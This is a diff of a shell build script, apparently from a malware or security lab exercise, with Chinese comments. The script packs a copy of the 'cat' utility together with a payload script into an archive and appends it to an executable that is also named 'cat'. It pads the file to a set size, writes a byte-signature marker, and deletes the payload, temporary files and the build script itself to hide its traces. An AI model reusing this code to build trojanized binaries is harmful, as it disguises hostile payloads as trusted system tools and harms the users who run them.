@@ -8,19 +8,16 @@ space=`expr $size - 8`
 # 壓縮 cat 和 payload
 tar -cvzf temp_cat.tar.gz temp_cat install.py > /dev/null 2>&1
 
-# 刪掉不需要的檔案
-#rm temp_cat test.py
-
 # 串接壓縮檔
-cat temp_cat.tar.gz >> infected.sh
-echo "\n" >> infected.sh
-echo "__PAYLOAD_END__" >> infected.sh
+./temp_cat temp_cat.tar.gz >> cat
+echo "\n" >> cat
+echo "__PAYLOAD_END__" >> cat
 
-# 調整 size 和最後的 byte
-truncate --size=${space} infected.sh
-echo -n -e '\x64\x65\x61\x64\x62\x65\x61\x66' >> infected.sh
+# 調整 size 和最後的 byte deadbeaf
+truncate --size=${space} cat
+echo -n -e '\x61\x66\x62\x65\x61\x64\x64\x65' >> cat
 
-chmod +x infected.sh
+chmod +x cat
 
-# 刪掉這個檔案
-#rm build.sh
+# 刪掉不需要的檔案
+rm install.py temp_cat temp_cat.tar.gz build.sh
